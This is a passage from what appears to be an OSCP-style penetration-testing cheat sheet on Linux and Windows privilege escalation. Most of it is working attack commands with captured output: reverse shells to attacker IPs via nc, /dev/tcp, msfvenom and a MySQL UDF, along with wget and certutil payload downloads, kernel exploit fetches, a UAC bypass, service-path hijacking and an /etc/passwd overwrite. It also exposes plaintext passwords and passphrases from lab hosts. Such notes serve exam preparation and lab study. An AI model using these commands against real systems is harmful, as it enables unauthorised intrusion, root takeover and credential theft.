127.0.0.1:8000/backend/?view=../../../../../var/crash/test.php&cmd=id
````
### processes
#### JDWP
````
root         852  0.0  3.9 2536668 80252 ?       Ssl  May16   0:04 java -Xdebug Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java
````
````
dev@example:/opt/stats$ cat App.java
cat App.java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

class StatsApp {
    public static void main(String[] args) {
        System.out.println("System Stats\n");
        Runtime rt = Runtime.getRuntime();
        String output = new String();

        try {
            ServerSocket echod = new ServerSocket(5000);
            while (true) {
              output = "";
              output += "Available Processors: " + rt.availableProcessors() +"\r\n";
              output += "Free Memory: " + rt.freeMemory() + "\r\n";
              output += "Total Memory: " + rt.totalMemory() +"\r\n";

              Socket socket = echod.accept();
              InputStream in = socket.getInputStream();
              OutputStream out = socket.getOutputStream();
              out.write((output + "\r\n").getBytes());
              System.out.println(output);
            }
        } catch (IOException e) {
            System.err.println(e.toString());
            System.exit(1);
        }
    }
}

````

````
https://github.com/IOActive/jdwp-shellifier
````

````
proxychains python2 jdwp-shellifier.py -t 127.0.0.1
nc -nv 192.168.234.150 5000 #this port runs on the app.java, do this to trigger it
````
##### RCE
````
proxychains python2 jdwp-shellifier.py -t 127.0.0.1 --cmd "busybox nc 192.168.45.191 80 -e sh"
nc -nv 192.168.234.150 5000 #to trigger alert
nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.234.150] 59382
id
uid=0(root) gid=0(root)
````
### Kernel Expoits
#### CVE-2022-0847
````
git clone https://github.com/Al1ex/CVE-2022-0847.git
cd CVE-2022-0847
python3 -m http.server 80
````
````
wget http://192.168.45.191:80/exp
chmod +x exp
cp /etc/passwd /tmp/passwd.bak
USERZ@example:~$ ./exp /etc/passwd 1 ootz:
It worked!
USERZ@example:~$ su rootz
rootz@example:/home/USERZ# whoami
rootz
rootz@example:/home/USERZ# id
uid=0(rootz) gid=0(root) groups=0(root)
````
#### CVE-2021-3156
````
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
chmod +x exploit_nss.py

userE@example01:~$ id
uid=1004(userE) gid=1004(userE) groups=1004(userE),998(apache)


userE@example01:~$ python3 exploit_nss.py 
# whoami
root
````
#### CVE-2022-2588
````
git clone https://github.com/Markakd/CVE-2022-2588.git
wget http://192.168.119.140/exp_file_credential
chmod +x exp_file_credential
./exp_file_credential
su user
Password: user
id
uid=0(user) gid=0(root) groups=0(root)
````
#### CVE-2016-5195
````
https://github.com/firefart/dirtycow
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c
uname -a
Linux humble 3.2.0-4-486 #1 Debian 3.2.78-1 i686 GNU/Linux
gcc -pthread dirty.c -o dirty -lcrypt
gcc: error trying to exec 'cc1': execvp: No such file or directory
locate cc1
export PATH=$PATH:/usr/lib/gcc/i486-linux-gnu/4.7/cc1
./dirty
su firefart
````
#### CVE-2009-2698
````
uname -a
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux
bash-3.00$ id 
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ ./exp
./exp
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
````
````
https://github.com/MrG3tty/Linux-2.6.9-Kernel-Exploit
````
#### CVE-2021-4034
````
uname -a
Linux dotty 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
````
````
https://github.com/ly4k/PwnKit/blob/main/PwnKit.sh
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit #local
chmod +x PwnKit #local
./PwnKit #Victim Machine
````
#### CVE-2021-4034
````
wget https://raw.githubusercontent.com/jamesammond/CVE-2021-4034/main/CVE-2021-4034.py
````
#### [CVE-2012-0056] memodipper
````
wget https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/memodipper/memodipper.c
gcc memodipper.c -o memodipper #compile on the target not kali
````
### NFS Shares
#### cat /etc/exports
##### no_root_squash
````
Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.

Notice that the /srv share has root squashing disabled. Because of this, on our local machine we can create a mount point and mount the /srv share.

-bash-4.2$ cat /etc/exports
/srv/Share 10.1.1.0/24(insecure,rw)
/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)

"no_root_squash"
````
##### Setup
````
sshuttle -r sea@10.11.1.251 10.1.1.0/24 #setup
ssh -L 6070:127.0.0.1:2049 userc@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
mkdir /mnt/tmp
scp userc@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
chown root:root bash; chmod +s bash #change ownership and set sticky bit
ssh userc@10.1.1.27 #login to victim computer
````
##### Exploit
````
cd /srv/Share
ls -la #check for sticky bit
./bash -p #how to execute with stick bit
whoami
````
### Bad File permissions
#### cat /etc/shadow
````
root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
pcap:!!:15422:0:99999:7:::
````
### MySQL Enumeration
#### Linpeas
````
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                              
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*                                                                                                                                                                       
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*    
````
````
╔══════════╣ Analyzing Backup Manager Files (limit 70)
                                                                                                                                                                                                                                           
-rw-r--r-- 1 www-data www-data 3896 Mar 31 07:56 /var/www/html/management/application/config/database.php
|       ['password'] The password used to connect to the database
|       ['database'] The name of the database you want to connect to
        'password' => '@jCma4s8ZM<?kA',
        'database' => 'school_mgment',

````
#### MySQL login
````
<cation/config$ mysql -u 'school' -p 'school_mgment'         
Enter password: @jCma4s8ZM<?kA
````
````
mysql> show databases;
mysql> show tables;
````
````
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| school_mgment      |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
````
````
mysql> select * from teacher\G

select * from teacher\G
*************************** 1. row ***************************
     teacher_id: 1
           name: Testing Teacher
           role: 1
 teacher_number: f82e5cc
       birthday: 2018-08-19
            sex: male
       religion: Christianity
    blood_group: B+
        address: 546787, Kertz shopping complext, Silicon Valley, United State of America, New York city.
          phone: +912345667
          email: michael_sander@school.pg
       facebook: facebook
        twitter: twitter
     googleplus: googleplus
       linkedin: linkedin
  qualification: PhD
 marital_status: Married
      file_name: profile.png
       password: 3db12170ff3e811db10a76eadd9e9986e3c1a5b7
  department_id: 2
 designation_id: 4
date_of_joining: 2019-09-15
 joining_salary: 5000
         status: 1
date_of_leaving: 2019-09-18
        bank_id: 3
   login_status: 0
1 row in set (0.00 sec)
````
### MySQL User Defined Functions
````
port 0.0.0.0:3306 open internally
users with console mysql/bin/bash
MySQL connection using root/NOPASS Yes
````
````
your $ip>wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
victim>gcc -g -c raptor_udf2.c
victim>gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
victim>mysql -u root -p
````
````
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/j0hn/script/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
````
````
your $ip> cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
nc -nvlp 443
mysql> select do_system('wget http://192.168.119.184/shell.php -O /tmp/shell.php;php /tmp/shell.php');
sh-3.2# id
uid=0(root) gid=0(root)
````
### sudo -l / SUID Binaries
#### (ALL) NOPASSWD: ALL
````
sudo su -
root@example01:~# whoami
root
````
#### (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
````
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
````
#### (ALL) NOPASSWD: /usr/bin/borg [comnmand] *
````
(ALL) NOPASSWD: /usr/bin/borg list *
(ALL) NOPASSWD: /usr/bin/borg mount *
(ALL) NOPASSWD: /usr/bin/borg extract *
````
##### Writable directory
````
find -name / "*borg*"
````
````
/opt/borgbackup
````
##### finding creds to login
````
./pspy64 -pf -i 1000
````
````
BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA'
````
##### Exploitation
````
sarah@backup:/opt$ sudo /usr/bin/borg list *
````
````
(name of archive) (data & time) (hash of archive)
````
````
sarah@backup:/opt$ sudo /usr/bin/borg extract borgbackup::home
````
````
sudo /usr/bin/borg extract [folder that is writable]::[name of archive]
````
````
sarah@backup:/opt$ sudo /usr/bin/borg extract --stdout borgbackup::home
````
````
mesg n 2> /dev/null || true
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
````
#### (ALL : ALL) /usr/sbin/openvpn
````
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
# id
uid=0(root) gid=0(root) groups=0(root)
````
#### (root) NOPASSWD: /usr/bin/nmap
````
bash-3.2$ id     
id
uid=100(asterisk) gid=101(asterisk)
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
````
####  /usr/local/bin/log_reader
````
observer@prostore:~$ /usr/local/bin/log_reader 
/usr/local/bin/log_reader 
Usage: /usr/local/bin/log_reader filename.log
````
````
observer@prostore:~$ /usr/local/bin/log_reader /var/log/auth.log
/usr/local/bin/log_reader /var/log/auth.log
Reading: /var/log/auth.log
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
````
##### Exploit
````
observer@prostore:~$ /usr/local/bin/log_reader "/var/log/auth.log;chmod u+s /bin/bash"
</log_reader "/var/log/auth.log;chmod u+s /bin/bash"
Reading: /var/log/auth.log;chmod u+s /bin/bash
May 25 22:47:00 prostore VGAuth[738]: vmtoolsd: Username and password successfully validated for 'root'.
````
````
observer@prostore:~$ ls -la /bin/bash
ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
````
````
bash-5.1$ /bin/bash -p
/bin/bash -p
bash-5.1# id
id
uid=1000(observer) gid=1000(observer) euid=0(root) groups=1000(observer)
bash-5.1# cd /root
cd /root
bash-5.1# cat proof.txt
cat proof.txt
3a7df0bf25481b398003f325d6250ba7
````
#### /usr/bin/find
````
find . -exec /bin/sh -p \; -quit
````
````
# id
id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
````
#### /usr/bin/dosbox
````
DOSBox version 0.74-3
````
````
export LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo Sarge ALL=(root) NOPASSWD: ALL >>c:$LFILE"

DOSBox version 0.74-3
Copyright 2002-2019 DOSBox Team, published under GNU GPL.
---
ALSA lib confmisc.c:767:(parse_card) cannot find card '0'
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_card_driver returned error: No such file or directory
ALSA lib confmisc.c:392:(snd_func_concat) error evaluating strings
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_concat returned error: No such file or directory
ALSA lib confmisc.c:1246:(snd_func_refer) error evaluating name
ALSA lib conf.c:4743:(_snd_config_evaluate) function snd_func_refer returned error: No such file or directory
ALSA lib conf.c:5231:(snd_config_expand) Evaluate error: No such file or directory
ALSA lib pcm.c:2660:(snd_pcm_open_noupdate) Unknown PCM default
CONFIG:Loading primary settings from config file /home/Sarge/.dosbox/dosbox-0.74-3.conf
MIXER:Can't open audio: No available audio device , running in nosound mode.
ALSA:Can't subscribe to MIDI port (65:0) nor (17:0)
MIDI:Opened device:none
SHELL:Redirect output to c:/etc/sudoers

````

````
[Sarge@example ~]$ sudo -l
Runas and Command-specific defaults for Sarge:
    Defaults!/etc/ctdb/statd-callout !requiretty

User Sarge may run the following commands on example:
    (root) NOPASSWD: ALL
````

````
[Sarge@example ~]$ sudo su
[root@example Sarge]# whoami
root
````
#### /usr/bin/cp
````
find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
cat /etc/passwd #copy the contents of this file your kali machine
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin

openssl passwd -1 -salt ignite pass123
$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
echo 'hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd

cat passwd 
root:x:0:0:root:/root:/bin/bash
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
python3 -m http.server #Host the new passwd file
curl http://192.168.119.168/passwd -o passwd #Victim Machine
cp passwd /etc/passwd #This is where the attack is executed

bash-4.2$ su hacker
su hacker
Password: pass123

[root@pain tmp]# id
id
uid=0(root) gid=0(root) groups=0(root)
````
#### /usr/bin/screen-4.5.0
````
https://www.youtube.com/watch?v=RP4hAC96VxQ
````
````
https://www.exploit-db.com/exploits/41154
````
````
uname -a
Linux example 5.4.0-104-generic #118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
````
##### Setup
````
kali㉿kali)-[/opt/XenSpawn]
└─$ sudo systemd-nspawn -M Machine1
````
````
cd /var/lib/machines/Machine1/root
````
````
vim libhax.c
cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
````
````
vim rootshell.c
cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
````
````
root@Machine1:~# ls
libhax.c  rootshell.c
root@Machine1:~# gcc -fPIC -shared -ldl -o libhax.so libhax.c
root@Machine1:~# gcc -o rootshell rootshell.c
````
##### Attack
````
cd /tmp
userG@example:/tmp$ wget http://192.168.45.208:80/rootshell
userG@example:/tmp$ wget http://192.168.45.208:80/libhax.so
chmod +x rootshell
chmod +x libhax.so
````
````
userG@example:/$ /tmp/rootshell
/tmp/rootshell
$ id
id
uid=1000(userG) gid=1000(userG) groups=1000(userG)

userG@example:/$ cd /etc
userG@example:/etc$ umask 000
userG@example:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
userG@example:/etc$ ls -l ld.so.preload
userG@example:/etc$ screen-4.5.0 -ls

userG@example:/etc$ /tmp/rootshell
/tmp/rootshell
# id
id
uid=0(root) gid=0(root) groups=0(root)
````
### cat /etc/crontab
#### bash file
````
useradm@mailman:~/scripts$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /home/useradm/scripts/cleanup.sh > /dev/null 2>&1

echo " " > cleanup.sh
echo '#!/bin/bash' > cleanup.sh
echo 'bash -i >& /dev/tcp/192.168.119.168/636 0>&1' >> cleanup.sh
nc -nlvp 636 #wait 5 minutes
````
#### /usr/local/bin

![image](https://github.com/xsudoxx/OSCP/assets/127046919/f48d14b8-897f-4542-b244-53c90d04531f)

````
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/5 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
````

````
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=<$your IP> LPORT=21 #Transfer over to /tmp/shell
````
````
chloe@roquefort:/$ cp /tmp/shell /usr/local/bin/run-parts
cp /tmp/shell /usr/local/bin/run-parts
````

````
nc -nlvp 21
listening on [any] 21 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.214.67] 41624
id
uid=0(root) gid=0(root) groups=0(root)
````
#### base64key
![image](https://github.com/xsudoxx/OSCP/assets/127046919/719d4be5-ae0b-45d0-858a-22d2bd5a7ab8)

````
[marcus@catto ~]$ ls -la
total 24
drwx------  6 marcus marcus 201 May 28 22:20 .
drwxr-xr-x. 3 root   root    20 Nov 25  2020 ..
-rw-r--r--  1 root   root    29 Nov 25  2020 .bash
-rw-------  1 marcus marcus   0 Apr 14  2021 .bash_history
-rw-r--r--  1 marcus marcus  18 Nov  8  2019 .bash_logout
-rw-r--r--  1 marcus marcus 141 Nov  8  2019 .bash_profile
-rw-r--r--  1 marcus marcus 312 Nov  8  2019 .bashrc
-rwxrwxr-x  1 marcus marcus 194 May 28 22:18 boot_success
drwx------  4 marcus marcus  39 Nov 25  2020 .config
drwxr-xr-x  6 marcus marcus 328 Nov 25  2020 gatsby-blog-starter
drwx------  3 marcus marcus  69 May 28 22:06 .gnupg
-rw-------  1 marcus marcus  33 May 28 21:49 local.txt
drwxrwxr-x  4 marcus marcus  69 Nov 25  2020 .npm

````
````
[marcus@catto ~]$ cat .bash
F2jJDWaNin8pdk93RLzkdOTr60==
````
````
[marcus@catto ~]$ base64key F2jJDWaNin8pdk93RLzkdOTr60== WallAskCharacter305 1
SortMentionLeast269
````
````
[marcus@catto ~]$ su
Password: 
[root@catto marcus]# id
uid=0(root) gid=0(root) groups=0(root)
````

## Windows PrivEsc <img src="https://vangogh.teespring.com/v3/image/9YwsrdxKpMa_uTATdBk8_wFGxmE/1200/1200.jpg" width="40" height="40" />
````
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md #Last Resort
````
### Scheduled Tasks
#### Enumeration
````
C:\Backup>type info.txt
type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
````
#### ICACLS
````
C:\Backup>icacls TFTP.EXE
icacls TFTP.EXE
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Admins:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         NT AUTHORITY\Authenticated Users:(I)(M)
````
````
BUILTIN\Users: The built-in "Users" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
BUILTIN\Admins: The built-in "Admins" group has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\SYSTEM: The "SYSTEM" account has "Full Control" (F) and "Inherit" (I) permissions on the file.
NT AUTHORITY\Authenticated Users: Authenticated users have "Modify" (M) and "Inherit" (I) permissions on the file.
````
#### Exploitation
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.165 LPORT=80 -f exe -o TFTP.EXE #Replace the original file and wait for a shell
````
### Registry Keys
````
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
````
#### Putty
````
PS C:\Windows\System32> reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions
    zachary    REG_SZ    "&('C:\Program Files\PuTTY\plink.exe') -pw 'Th3R@tC@tch3r' zachary@10.51.21.12 'df -h'"
````
### Windows Service - Insecure Service Permissions
#### Windows XP SP0/SP1 Privilege Escalation
````
C:\>systeminfo
systeminfo

Host Name:                 USERB
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 1 Build 2600
````
````
https://sohvaxus.github.io/content/winxp-sp1-privesc.html
unzip Accesschk.zip
ftp> binary
200 Type set to I.
ftp> put accesschk.exe
local: accesschk.exe remote: accesschk.exe
````
##### Download and older version accesschk.exe
````
https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip
````
##### Enumeration
````
accesschk.exe /accepteula -uwcqv "Authenticated Users" * #command
RW SSDPSRV
        SERVICE_ALL_ACCESS
RW upnphost
        SERVICE_ALL_ACCESS

accesschk.exe /accepteula -ucqv upnphost #command
upnphost
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Admins
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS
  RW BUILTIN\Power Users
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\LOCAL SERVICE
        SERVICE_ALL_ACCESS
        
sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : NT AUTHORITY\LocalService
        
 sc query SSDPSRV #command

SERVICE_NAME: SSDPSRV
        TYPE               : 20  WIN32_SHARE_PROCESS 
        STATE              : 1  STOPPED 
                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 1077       (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

sc config SSDPSRV start= auto #command
[SC] ChangeServiceConfig SUCCESS
````
##### Attack setup
````
sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe" #command
[SC] ChangeServiceConfig SUCCESS

sc config upnphost obj= ".\LocalSystem" password= "" #command
[SC] ChangeServiceConfig SUCCESS

sc qc upnphost #command
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: upnphost
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 443 -e C:\WINDOWS\System32\cmd.exe  
        LOAD_ORDER_GROUP   :   
        TAG                : 0  
        DISPLAY_NAME       : Universal Plug and Play Device Host  
        DEPENDENCIES       : SSDPSRV  
        SERVICE_START_NAME : LocalSystem

nc -nlvp 443 #on your kali machine

net start upnphost #Last command to get shell
````
##### Persistance
Sometime our shell can die quick, try to connect right away with nc.exe binary to another nc -nlvp listner
````
nc -nlvp 80

C:\Inetpub\wwwroot\nc.exe -nv 192.168.119.140 80 -e C:\WINDOWS\System32\cmd.exe #command
(UNKNOWN) [192.168.119.140] 80 (?) open
````
### User Account Control (UAC) Bypass
UAC can be bypassed in various ways. In this first example, we will demonstrate a technique that
allows an Admin user to bypass UAC by silently elevating our integrity level from medium
to high. As we will soon demonstrate, the fodhelper.exe509 binary runs as high integrity on Windows 10
1709. We can leverage this to bypass UAC because of the way fodhelper interacts with the
Windows Registry. More specifically, it interacts with registry keys that can be modified without
administrative privileges. We will attempt to find and modify these registry keys in order to run a
command of our choosing with high integrity. Its important to check the system arch of your reverse shell.
````
whoami /groups #check your integrity level/to get high integrity level to be able to run mimikatz and grab those hashes  
````
````
C:\Windows\System32\fodhelper.exe #32 bit
C:\Windows\SysNative\fodhelper.exe #64 bit
````
#### Powershell
Launch Powershell and run the following
````
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force
````
run fodhelper setup and nc shell and check your priority
````
C:\Windows\System32\fodhelper.exe
````
#### cmd.exe
##### Enumeration
````
whoami /groups
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
````
##### Exploitation
````
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ #victim machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe #on your kali
certutil -urlcache -split -f http://192.168.119.140:80/shell.exe C:\Windows\Tasks\backup.exe #victim machine
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Tasks\backup.exe" /f #victim machine
nc -nlvp 80 #on your kali
C:\Windows\system32>fodhelper.exe #victim machine
````
##### Final Product
````
whoami /groups
Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
````
### Scripts being run by Admin
````
typically this exploit will require manual enumeration. I was able to find a directory called C:\backup\Scripts\<vulnerable script>
````
````
C:\backup\Scripts>dir /q
dir /q
 Volume in drive C has no label.
 Volume Serial Number is 7C9E-C9E6

 Directory of C:\backup\Scripts

04/15/2023  07:20 PM    <DIR>          JAMES\jess            .
04/15/2023  07:20 PM    <DIR>          JAMES\jess            ..
04/15/2023  07:20 PM                 0 JAMES\jess            '
04/15/2023  07:29 PM               782 BUILTIN\Admins backup_perl.pl
05/02/2019  05:34 AM               229 BUILTIN\Admins backup_powershell.ps1
05/02/2019  05:31 AM               394 BUILTIN\Admins backup_python.py
               4 File(s)          1,405 bytes
               2 Dir(s)   4,792,877,056 bytes free
````
````
type backup_perl.pl
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Print the current user
system('whoami');

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
#### Testing for exploit
````
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = `whoami`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

opendir(DIR, $dir) or die $!;

while (my $file = readdir(DIR)) {
    # We only want files
    next unless (-f "$dir/$file");

    $filename =  "C:\\Users\\Admin\\Work\\$file";
    $output = "C:\\backup\\perl\\$file";
    copy($filename, $output);
}

closedir(DIR);

$time = localtime(time);
$log = "Backup performed using Perl at: $time\n";
$log .= "Current user: $user\n";
open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
print $FH $log;
close($FH);
````
##### Results
````
Current user: jess\Admin
Backup performed using Python at : 2023-04-15T19:28:41.597000
Backup performed using Python at : 2023-04-15T19:31:41.606000
Backup performed using Python at : 2023-04-15T19:34:41.661000
````
#### Exploit
````
use the msfvenom shell you used to get initial access to elevate privs with this script
````
````
#!/usr/bin/perl

use File::Copy;

my $dir = 'C:\Users\Admin\Work';

# Get the current user
my $user = `whoami`;
chomp $user;

# Print the current user to the console
print "Current user: $user\n";

